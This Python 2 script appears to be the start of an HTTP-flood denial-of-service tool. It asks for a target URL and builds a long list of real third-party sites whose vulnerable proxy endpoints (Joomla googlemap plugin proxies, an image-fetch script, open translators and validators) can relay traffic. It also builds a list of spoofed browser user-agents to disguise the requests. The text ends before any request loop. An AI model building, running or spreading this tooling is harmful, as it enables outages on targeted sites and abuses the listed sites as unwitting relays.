import os
import sys
import urllib2
import threading
import random

########################################

"""

"""


if sys.platform == "linux" or sys.platform == "linux2":
    os.system("clear")
elif sys.platform == "win32":
    os.system("cls")

print (" ")
print ("     _    ____  ____   _    ____ _____ ___ __  __ ")
print ("    / \  / ___||  _ \ / \  |  _ \_   _|_ _|  \/  |")
print ("   / _ \ \___ \| |_) / _ \ | |_) || |  | || |\/| |")
print ("  / ___ \ ___) |  __/ ___ \|  _ < | |  | || |  | |")
print (" /_/   \_\____/|_| /_/   \_\_| \_\|_| |___|_|  |_|")
print (" ")
print ("\033[1;32m")
url = raw_input("URL : ")
print ("\033[1;m")

count = 0
headers = []
referer = {
    "http://duckduckgo.com/",
    "http://www.google.com/",
    "http://www.youtube.com",
    "http://vk.com/",
    "http://yandex.ru/",
    "https://drive.google.com/viewerng/viewer?url=",
    "http://www.yahoo.com/",
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
    "https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=",
    "http://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
    "http://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=",
    "https://drive.google.com/viewerng/viewer?url=",
    "http://drive.google.com/viewerng/viewer?url=",
    "http://www.google.com/translate?u=",
    "https://developers.google.com/speed/pagespeed/insights/?url=",
    "http://developers.google.com/speed/pagespeed/insights/?url=",
    "http://help.baidu.com/searchResult?keywords=",
    "http://www.bing.com/search?q=",
    "https://add.my.yahoo.com/rss?url=",
    "https://play.google.com/store/search?q=",
    "http://add.my.yahoo.com/rss?url=",
    "http://play.google.com/store/search?q=",
    "http://www.google.com/?q=",
    "http://regex.info/exif.cgi?url=",
    "http://anonymouse.org/cgi-bin/anon-www.cgi/",
    "http://www.google.com/translate?u=",
    "http://translate.google.com/translate?u=",
    "http://validator.w3.org/feed/check.cgi?url=",
    "http://www.w3.org/2001/03/webdata/xsv?style=xsl&docAddrs=",
    "http://validator.w3.org/check?uri=",
    "http://jigsaw.w3.org/css-validator/validator?uri=",
    "http://validator.w3.org/checklink?uri=",
    "http://www.w3.org/RDF/Validator/ARPServlet?URI=",
    "http://www.w3.org/2005/08/online_xslt/xslt?xslfile=http%3A%2F%2Fwww.w3.org%2F2002%2F08%2Fextract-semantic.xsl&xmlfile=",
    "http://www.w3.org/2005/08/online_xslt/xslt?xmlfile=http://www.w3.org&xslfile=",
    "http://validator.w3.org/mobile/check?docAddr=",
    "http://validator.w3.org/p3p/20020128/p3p.pl?uri=",
    "http://online.htmlvalidator.com/php/onlinevallite.php?url=",
    "http://feedvalidator.org/check.cgi?url=",
    "http://gmodules.com/ig/creator?url=",
    "http://www.google.com/ig/adde?moduleurl=",
    "http://www.cynthiasays.com/mynewtester/cynthia.exe?rptmode=-1&url1=",
    "http://www.watchmouse.com/en/checkit.php?c=jpcheckit&vurl=",
    "http://host-tracker.com/check_page/?furl=",
    "http://panel.stopthehacker.com/services/validate-payflow?email=1@1.com&callback=a&target=",
    "http://www.onlinewebcheck.com/check.php?url=",
    "http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=",
    "http://www.translate.ru/url/translation.aspx?direction=er&sourceURL=",
    "http://about42.nl/www/showheaders.php;POST;about42.nl.txt",
    "http://browsershots.org;POST;browsershots.org.txt",
    "http://streamitwebseries.twww.tv/proxy.php?url=",
    "http://www.comicgeekspeak.com/proxy.php?url=",
    "http://67.20.105.143/bitess/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://bemaxjavea.com/javea-rentals-alquileres/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://centrobrico.net/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://conodeluz.org/magnanet/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://greenappledentaldt.com/home/templates/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://html.strost.ch/dgi/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://kobbeleia.net/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://krd-medway.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://minterne.co.uk/mjs/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://old.ucpb.org/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.abs-silos.de/en/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.admksg.ru/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.autoklyszewski.pl/autoklyszewski/mambots/content/plugin_googlemap2_proxy.php?url=",
    "http://www.build.or.at/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.caiverbano.it/sito/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.cbcstittsville.com/home/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.ciutatdeivissa.org/portal/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.contrau.com.br/web/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.dierenhotelspaubeek.nl/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.gaston-schul.nl/DU/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.gaston-schul.nl/FR/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.gillinghamgurdwara.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.gilmeuble.ch/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.hortonmccormick.com/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.kanzlei-berendes.de/homepage/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.kita-spielhaus.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.lacasaencarilo.com.ar/sitio/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.losaromos-spa.com.ar/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.losaromos-spa.com.ar/~losaromo/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.nickclift.co.uk/web/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.palagini.it/palagini/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.parsifaldisco.com/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.podosys.com/csm/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.renault-windisch.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.riegler-dorner.at/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.seevilla-dr-sturm.at/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.sounders.es/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.suelcasa.com/suelcasa/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.tcl.lu/Site/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.tijssen-staal.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.triatarim.com.tr/TriaEn/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.tus-haltern.de/site/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.vm-esslingen.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.zahnarzt-buhl.de/praxis/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.sultanpalace.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.bergenpol.com/cms//plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.arantzabelaikastola.com/webgunea//plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.fare-furore.com/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.dog-ryusen.com/plugins/system/plugin_googlemap2_proxy.php?url=",
    "http://www.spvgg-roedersheim.de/web/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
    "http://www.dahlnet.no/v2/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
    "http://ping-admin.ru/index.sema;POST;ping-admin.ru.txt",
    "http://web-sniffer.net/?url=",
    "http://sova-tour.com.ua/plugins/system/plugin_googlemap2_proxy.php?url=",
    "http://scu-oldesloe.de/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
    "http://translate.yandex.ru/translate?srv=yasearch&lang=ru-uk&url=",
    "http://translate.yandex.ua/translate?srv=yasearch&lang=ru-uk&url=",
    "http://translate.yandex.net/tr-url/ru-uk.uk/",
    "http://www.bongert.lu/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
    "http://laresmadrid.org/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
    "http://doleorganic.com/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://crawfordlivestock.com/plugins/system/plugin_googlemap2_proxy.php?url=",
    "http://www.aculaval.com/joomla/plugins/system/plugin_googlemap2_proxy.php?url=",
    "http://grandsultansaloon.com/plugins/system/plugin_googlemap2_proxy.php?url=",
    "http://www.d1010449.cp.blacknight.com/cpr.ie/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.architettaresas.it/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
    "http://basketgbkoekelare.be/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.arbitresmultisports.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
    "http://mobilrecord.com/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.dbaa.co.za/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
    "http://waggum-bevenrode.sg-bevenrode.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
    "http://bwsnt1.pdsda.net/plugins/system/plugin_googlemap3_proxy.php?url=",
    "http://www.astecdisseny.com/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.fillmorefairways.com/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.bus-reichert.eu/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
    "http://www.maxxxi.ru/plugins/system/plugin_googlemap2_proxy.php?url=",
    "http://potholepeople.co.nz/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
    "http://www.hammondgolf.com/plugins/system/plugin_googlemap2_proxy.php?url=",
    "http://www.footgoal33.com/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://bbtoma.com/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.tajmahalrestaurant.co.za/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
    "http://www.yerbabuenacuisine.com/plugins/system/plugin_googlemap2_proxy.php?url=",
    "http://www.rinner-alm.com/plugins/system/plugin_googlemap2_proxy.php?url=",
    "http://stockbridgetownhall.co.uk/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://mentzerrepairs.com/plugins/system/plugin_googlemap2_proxy.php?url=",
    "http://www.tilmouthwell.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
    "http://www.homevisionsinc.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
    "http://toddlers.nalanda.edu.in/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
    "http://cultura-city.rv.ua/plugins/system/plugin_googlemap3_proxy.php?url=",
    "http://secret.leylines.info/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
    "http://bike-electric.co.uk/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
    "http://www.centroaquaria.com/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://agenzia-anna.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
    "http://www.gretnadrug.com/plugins/system/plugin_googlemap2_proxy.php?url=",
    "http://www.crestwoodpediatric.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
    "http://www.oceans-wien.com/plugins/system/plugin_googlemap2_proxy.php?url=;BYPASS",
    "http://lavori.joomlaskin.it/italyhotels/wp-content/plugins/js-multihotel/includes/show_image.php?w=1&h=1&file=",
    "http://santaclaradelmar.com/hoteles/wp-content/plugins/js-multihotel/includes/show_image.php?w=1&h=1&file=",
    "http://www.authentic-luxe-locations.com/wp-content/plugins/js-multihotel/includes/show_image.php?w=1&h=1&file=",
    "http://www.keenecinemas.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
    "http://www.hotelmonyoli.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
    "http://prosperitydrug.com/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://policlinicamonteabraao.com/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.vetreriafasanese.com/plugins/system/plugin_googlemap2_proxy.php?url=",
    "http://www.benawifi.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
    "http://www.valleyview.sa.edu.au/plugins/system/plugin_googlemap2_proxy.php?url=",
    "http://www.racersedgekarting.com/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.minterne.co.uk/mjs/plugins/content/plugin_googlemap2_proxy.php?url=?url=",
    "http://www.villamagnoliarelais.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
    "http://worldwide-trips.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
    "http://systemnet.com.ua/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
    "http://www.netacad.lviv.ua/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
    "http://www.veloclub.ru/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
    "http://www.virtualsoft.pl/plugins/content/plugin_googlemap3_proxy.php?url=",
    "http://gminazdzieszowice.pl/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
    "http://fets3.freetranslation.com/?Language=English%2FSpanish&Sequence=core&Url=",
    "http://www.fare-furore.com/com-line/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.rotisseriesalaberry.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
    "http://www.lbajoinery.com.au/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.seebybike.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
    "http://www.copiflash.com/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://suttoncenterstore.com/plugins/system/plugin_googlemap2_proxy.php?url=",
    "http://coastalcenter.net/plugins/system/plugin_googlemap2_proxy.php?url=",
    "http://whitehousesurgery.org/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.vertexi.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
    "http://www.owl.cat/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
    "http://www.sizzlebistro.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
    "http://thebluepine.com/plugins/system/plugin_googlemap2_proxy.php?url=",
    "http://donellis.ie/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
    "http://validator.w3.org/unicorn/check?ucn_task=conformance&ucn_uri=",
    "http://validator.w3.org/nu/?doc=",
    "http://check-host.net/check-http?host=",
    "http://www.netvibes.com/subscribe.php?url=",
    "http://www-test.cisel.ch/web/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.sistem5.net/ww/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
    "http://www.fmradiom.hu/palosvorosmart/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.iguassusoft.com/site/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://lab.univ-batna.dz/lea/plugins/system/plugin_googlemap2_proxy.php?url=",
    "http://www.computerpoint3.it/cp3/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
    "http://hotel-veles.com/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://klaassienatuinstra.nl/plugins/content/plugin_googlemap2_proxy.php?url=",
    "http://www.google.com/ig/add?feedurl=",
    "http://anonymouse.org/cgi-bin/anon-www.cgi/",
    "http://www.google.com/translate?u=",
    "http://translate.google.com/translate?u=",
    "http://validator.w3.org/feed/check.cgi?url=",
    "http://www.w3.org/2001/03/webdata/xsv?style=xsl&docAddrs=",
    "http://validator.w3.org/check?uri=",
    "http://jigsaw.w3.org/css-validator/validator?uri=",
    "http://validator.w3.org/checklink?uri=",
    "http://qa-dev.w3.org/unicorn/check?ucn_task=conformance&ucn_uri=",
    "http://www.w3.org/RDF/Validator/ARPServlet?URI=",
    "http://www.w3.org/2005/08/online_xslt/xslt?xmlfile=http://www.w3.org&xslfile=",
    "http://www.w3.org/services/tidy?docAddr=",
    "http://validator.w3.org/mobile/check?docAddr=",
    "http://validator.w3.org/p3p/20020128/p3p.pl?uri=",
    "http://validator.w3.org/p3p/20020128/policy.pl?uri=",
    "http://online.htmlvalidator.com/php/onlinevallite.php?url=",
    "http://feedvalidator.org/check.cgi?url=",
    "http://gmodules.com/ig/creator?url=",
    "http://www.google.com/ig/adde?moduleurl=",
    "http://www.cynthiasays.com/mynewtester/cynthia.exe?rptmode=-1&url1=",
    "http://www.watchmouse.com/en/checkit.php?c=jpcheckit&vurl=",
    "http://host-tracker.com/check_page/?furl=",
    "http://panel.stopthehacker.com/services/validate-payflow?email=1@1.com&callback=a&target=",
    "http://www.viewdns.info/ismysitedown/?domain=",
    "http://www.onlinewebcheck.com/check.php?url=",
    "http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=",
    "http://www.translate.ru/url/translation.aspx?direction=er&sourceURL=",
    "http://streamitwebseries.twww.tv/proxy.php?url=",
    "http://www.comicgeekspeak.com/proxy.php?url="
}


def useragent():
    global headers
    headers.append("Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152)")
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)")
    headers.append("Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36")    
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.0; es-ES; rv:1.8.0.3) Gecko/20060426 Firefox/1.5.0.3")
    headers.append("Mozilla/5.0 (Linux; U; Android 4.0.4; fr-fr; MIDC409 Build/IMM76D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30")
    headers.append("Mozilla/5.0 (Linux; U; Android 4.0.3; fr-fr; MIDC410 Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30")
    headers.append("Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1")
    headers.append("Mozilla/5.0 (Linux; U; Android 4.0.3; ru-ru; Explay Surfer 7.02 Build/ICS.g12refM703A1HZ1.20121009) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0")
    headers.append("Mozilla/5.0 (Linux; Android 4.2.1; Nexus 7 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Safari/535.19")
    headers.append("Mozilla/5.0 (Android; Mobile; rv:18.0) Gecko/18.0 Firefox/18.0")
    headers.append("Mozilla/5.0 (Linux; Android 4.2.1; Nexus 4 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Mobile Safari/535.19")
    headers.append("Mozilla/5.0 (Linux; U; Android 4.0.3; es-es; MIDC410 Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30")
    headers.append("Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Safari/535.19")
    headers.append("Mozilla/5.0 (Linux; Android 4.1.2; GT-I9300 Build/JZO54K) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Mobile Safari/535.19")
    headers.append("Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Safari/535.19")
    headers.append("Mozilla/5.0 (Linux; U; Android 4.0.2; en-us; Galaxy Nexus Build/ICL53F) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30")
    headers.append("Mozilla/5.0 (Android; Tablet; rv:18.0) Gecko/18.0 Firefox/18.0")
    headers.append("Mozilla/5.0 (Linux; U; Android 4.1.1; en-us; Nexus S Build/JRO03E) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30")
    headers.append("Mozilla/5.0 (Linux; Android 4.2.1; Nexus 10 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Safari/535.19")
    headers.append("Mozilla/5.0 (Linux; U; Android 4.1.2; en-gb; GT-I9300 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30")
    headers.append("Mozilla/5.0 (Linux; Android 4.2.1; Galaxy Nexus Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Mobile Safari/535.19")
    headers.append("Mozilla/5.0 (Linux; U; Android 4.1.2; en-au; GT-N5100 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30")
    headers.append("MSM7627A/1.0 Android/2.3 gingerbread/2.3.5 Release/11.16.2011 Browser/WebKit533.1 Profile/MIDP-1.0 Configuration/CLDC-1.0")
    headers.append("Opera/9.80 (Android 4.0.4; Linux; Opera Mobi/ADR-1301080958) Presto/2.11.355 Version/12.10")
    headers.append("Mozilla/5.0 (iPad; CPU OS 6_1 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10B141 Safari/8536.25")
    headers.append("Mozilla/5.0 (iPad; CPU OS 6_0_1 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A523 Safari/8536.25")
    headers.append("Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3")
    headers.append("Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10")
    headers.append("Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10")
    headers.append("Mozilla/5.0 (iPad; CPU OS 6_1 like Mac OS X; en-us) AppleWebKit/536.26 (KHTML, like Gecko) CriOS/23.0.1271.100 Mobile/10B141 Safari/8536.25")
    headers.append("Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25")
    headers.append("Mozilla/5.0 (iPad; CPU OS 6_1 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Mobile/10B141")
    headers.append("Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A403 Safari/8536.25")
    headers.append("Mozilla/5.0 (iPad; CPU iPhone OS 501 like Mac OS X) AppleWebKit/534.46 (KHTML like Gecko) Version/5.1 Mobile/9A405 Safari/7534.48.3")
    headers.append("Mozilla/5.0 (iPad; CPU OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3")
    headers.append("Mozilla/5.0 (iPad; CPU OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B176 Safari/7534.48.3")
    headers.append("Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A407 Safari/8536.25")
    headers.append("Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) CriOS/23.0.1271.100 Mobile/8L1 Safari/6533.18.5")
    headers.append("Mozilla/5.0 (iPad; CPU OS 6_1 like Mac OS X; en-gb) AppleWebKit/536.26 (KHTML, like Gecko) CriOS/23.0.1271.100 Mobile/10B141 Safari/8536.25")
    headers.append("Mozilla/5.0 (iPad; CPU OS 6_1 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Mobile/10B141 AIRMobileSecureBrowser/1.0")
    headers.append("Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25")
    headers.append("Mozilla/5.0 (iPad; CPU OS 6_0_1 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Mobile/10A523")
    headers.append("Mozilla/5.0 (iPad; CPU OS 5_0_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A405 Safari/7534.48.3")
    headers.append("Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5")
    headers.append("Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16")
    headers.append("Mozilla/5.0 (iPhone; CPU iPhone OS 6_1 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10B143 Safari/8536.25")
    headers.append("Mozilla/5.0 (iPhone; CPU iPhone OS 6_1 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10B142 Safari/8536.25")
    headers.append("Mozilla/5.0 (iPhone; CPU iPhone OS 6_0_1 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A523 Safari/8536.25")
    headers.append("Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_2 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8H7 Safari/6533.18.5")
    headers.append("Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_0 like Mac OS X; en-us) AppleWebKit/532.9 (KHTML, like Gecko) Version/4.0.5 Mobile/8A293 Safari/6531.22.7")
    headers.append("Mozilla/5.0 (iPhone; CPU iPhone OS 6_1 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10B144 Safari/8536.25")
    headers.append("Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3")
    headers.append("Mozilla/5.0 (iPhone; CPU iPhone OS 6_0_2 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A551 Safari/8536.25")
    headers.append("Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3")
    headers.append("Mozilla/5.0 (iPhone; CPU iPhone OS 6_1 like Mac OS X; en-us) AppleWebKit/536.26 (KHTML, like Gecko) CriOS/23.0.1271.100 Mobile/10B143 Safari/8536.25")
    headers.append("Mozilla/5.0 (iPad; CPU iPhone OS 501 like Mac OS X) AppleWebKit/534.46 (KHTML like Gecko) Version/5.1 Mobile/9A405 Safari/7534.48.3")
    headers.append("Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B176 Safari/7534.48.3")
    headers.append("Mozilla/5.0 (iPhone; CPU iPhone OS 6_1 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10B141 Safari/8536.25")
    headers.append("Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A403 Safari/8536.25")
    headers.append("Mozilla/5.0 (iPhone; U; CPU iPhone OS 5_0 like Mac OS X; en) AppleWebKit/528.18 (KHTML, like Gecko) Version/5.1 Mobile/7A341 Safari/528.16")
    headers.append("Mozilla/5.0 (iPhone; CPU iPhone OS 6_0_1 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Mercury/7.2 Mobile/10A523 Safari/8536.25")
    headers.append("Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3")
    headers.append("Mozilla/5.0 (iPhone; CPU iPhone OS 5_0_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A405 Safari/7534.48.3")
    headers.append("Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3 like Mac OS X; de-de) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8F190")
    headers.append("Mozilla/5.0 (Danger hiptop 3.4; U; AvantGo 3.2)")
    headers.append("Mozilla/3.0 (compatible; AvantGo 3.2)")
    headers.append("Mozilla/5.0 (compatible; AvantGo 3.2; ProxiNet; Danger hiptop 1.0)")
